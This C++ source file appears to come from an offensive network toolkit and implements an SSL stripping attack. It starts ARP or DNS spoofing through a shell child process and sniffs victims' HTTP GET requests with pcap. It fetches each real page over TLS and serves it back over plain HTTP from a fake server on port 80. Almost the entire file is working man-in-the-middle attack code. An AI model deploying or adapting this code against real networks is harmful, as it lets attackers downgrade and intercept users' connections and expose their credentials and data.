#include "ssl_stripping/all_out.h"
#include "HttpLayer.h"
#include "IPv4Layer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "TcpLayer.h"
#include "common/common.h"
#include "log.h"
#include "ssl_stripping/public.h"
#include <boost/asio/connect.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/asio/ip/address.hpp>
#include <boost/asio/ip/basic_resolver.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/read.hpp>
#include <boost/asio/ssl/context.hpp>
#include <boost/asio/ssl/stream.hpp>
#include <boost/asio/streambuf.hpp>
#include <boost/asio/write.hpp>
#include <condition_variable>
#include <exception>
#include <future>
#include <mutex>
#include <queue>
#include <sstream>
#include <stdexcept>
#include <thread>

#ifdef __linux__
#include <csignal>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#endif

void ATK::SSL::AllOutSslStrippingStrategy::runHttpDummyServer() {
    const uint16_t HTTP_PORT = 80;
    std::thread([]() {
        try {
            boost::asio::io_context ioc;
            boost::asio::ip::tcp::acceptor acceptor(
                ioc, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(),
                                                    HTTP_PORT));

            while (true) {
                boost::asio::ip::tcp::socket socket(ioc);
                acceptor.accept(socket);

                auto &httpMessageData = getHttpMessageData();

                // Wait for a packet size to be available
                std::unique_lock<std::mutex> lock(
                    httpMessageData.httpMessagesMutex);
                httpMessageData.httpMessagesCV.wait(lock, [&] {
                    return !httpMessageData.httpMessages.empty();
                });

                const std::string httpMessage =
                    httpMessageData.httpMessages.front();
                httpMessageData.httpMessages.pop();
                lock.unlock();

                std::ostringstream response;
                response << "HTTP/1.1 200 OK\r\n"
                         << "Content-Type: text/html\r\n"
                         << "Content-Length: " << httpMessage.length() << "\r\n"
                         << "Connection: close\r\n"
                         << "\r\n"
                         << httpMessage;

                boost::system::error_code exc;
                LOG_INFO("Sending back stripped HTTP response")
                boost::asio::write(socket, boost::asio::buffer(response.str()),
                                   exc);

                socket.close();
            }
        } catch (const std::exception &e) {
            LOG_ERROR("Dummy HTTP server exception: " + std::string(e.what()));
        }
    }).detach(); // detach the thread to let it run in background
}

std::optional<std::string>
ATK::SSL::AllOutSslStrippingStrategy::connectWithServer(
    const std::string &domain) {
    try {
        const std::string HTTPS_PORT = "443";

        // Setup the asio and SSL context
        boost::asio::io_context ioc;
        boost::asio::ssl::context ssl_ctx(
            boost::asio::ssl::context::tls_client);

        // Tell asio to use the default system certificate store
        ssl_ctx.set_default_verify_paths();

        // Create the SSL stream, wrapping a TCP socket
        boost::asio::ssl::stream<boost::asio::ip::tcp::socket> stream(ioc,
                                                                      ssl_ctx);

        // Tell the server which website you want to talk to.
        SSL_set_tlsext_host_name(stream.native_handle(), domain.c_str());

        // Resolve the hostname to an IP address
        boost::asio::ip::tcp::resolver resolver(ioc);
        auto endpoints = resolver.resolve(domain, HTTPS_PORT);

        // Connect the underlying TCP socket
        boost::asio::connect(stream.lowest_layer(), endpoints);

        // Perform the TLS Handshake
        stream.handshake(boost::asio::ssl::stream_base::client);

        LOG_INFO("Handshake successful!");

        // Send an HTTP GET request over the secure stream
        std::string request = "GET / HTTP/1.1\r\nHost: " + domain +
                              "\r\nConnection: close\r\n\r\n";
        boost::asio::write(stream, boost::asio::buffer(request));

        // Read the response
        boost::asio::streambuf response;
        boost::system::error_code exc;
        boost::asio::read(stream, response, exc);

        // Check for a clean close
        if (exc == boost::asio::error::eof ||
            exc == boost::asio::ssl::error::stream_truncated) {
            LOG_INFO("Cleanly received real server response");
            std::istream response_stream(&response);
            std::string line;
            bool in_body = false;

            std::ostringstream html_body;

            while (std::getline(response_stream, line)) {
                if (!in_body) {
                    // Look for the blank line between headers and body
                    if (line == "\r" || line.empty()) {
                        in_body = true;
                    }
                } else {
                    html_body << line << "\n";
                }
            }

            return html_body.str();
        }
        if (exc) {
            throw boost::system::system_error(exc);
        }
        return std::nullopt;
    } catch (std::exception &e) {
        LOG_ERROR("Exception: " + std::string(e.what()));
        return std::nullopt;
    }
}

void ATK::SSL::AllOutSslStrippingStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
    void * /*cookie*/) {
    const pcpp::Packet parsedPacket(packet);

    // Check IPv4 layer
    auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipLayer == nullptr) {
        return;
    }

    // Check TCP layer
    auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
    const int HTTP_PORT = 80;
    if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
        return;
    }

    // Access HTTP Layer
    auto *httpRequestLayer =
        parsedPacket.getLayerOfType<pcpp::HttpRequestLayer>();
    if (httpRequestLayer == nullptr) {
        return;
    }

    // Check if method is GET
    if (httpRequestLayer->getFirstLine()->getMethod() !=
        pcpp::HttpRequestLayer::HttpGET) {
        return;
    }

    // Check Host header
    pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
    if (hostField == nullptr) {
        return;
    }

    // Check whether domain is in Host header and start SSL attack if so
    const std::string hostValue = hostField->getFieldValue();
    auto &httpMessageData = getHttpMessageData();
    LOG_INFO("Connecting to " + hostValue + "...");
    std::optional<std::string> realHtmlFromServer =
        ATK::SSL::AllOutSslStrippingStrategy::connectWithServer(hostValue);
    if (!realHtmlFromServer.has_value()) {
        LOG_ERROR("Could not connect to server!");
        return;
    }

    // Add HTML code to queue for HTTP response
    {
        const std::lock_guard<std::mutex> lock(
            httpMessageData.httpMessagesMutex);
        httpMessageData.httpMessages.emplace(realHtmlFromServer.value() + "\n");
    }
    httpMessageData.httpMessagesCV.notify_one();
}

void ATK::SSL::AllOutSslStrippingStrategy::execute() {
    std::string cmd;
    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
        std::ostringstream command;
        command
            << "\"" << ATK::Common::getProcessName() << "\" --arp"
            << " \"" << device_->getName() << "\""
            << " \"\""; // Supply empty attackerMac to automatically derive it
        cmd = command.str();
    } else { // Perform DNS spoofing in the background
        std::ostringstream command;
        command << "\"" << ATK::Common::getProcessName() << "\" --dns"
                << " \"" << device_->getName() << "\""
                << " \"" << attackerIp_.toString() << "\"";
        cmd = command.str();
    }
    // Start ARP/DNS spoofing on different thread
#ifdef _WIN32
    HANDLE hJob = CreateJobObject(nullptr, nullptr);

    JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
    info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
                            sizeof(info));

    STARTUPINFO sInfo = {sizeof(sInfo)};
    PROCESS_INFORMATION pInfo;

    CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
                  nullptr, &sInfo, &pInfo);

    // Link child to the job
    AssignProcessToJobObject(hJob, pInfo.hProcess);

    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);
#else
    const pid_t pid = fork();
    if (pid == 0) {
        // To make sure child kills itself when this process dies
        // NOLINTNEXTLINE(cppcoreguidelines-pro-type-vararg,hicpp-vararg)
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        // NOLINTNEXTLINE(cppcoreguidelines-pro-type-vararg,hicpp-vararg)
        execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
        _exit(1);
    }
#endif

    ATK::SSL::AllOutSslStrippingStrategy::runHttpDummyServer();

    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    if (!device_->setFilter("tcp dst port 80")) {
        LOG_ERROR("Cannot set tcp filter");
        device_->close();
        throw std::runtime_error(
            "Unable to set http request filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing http packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}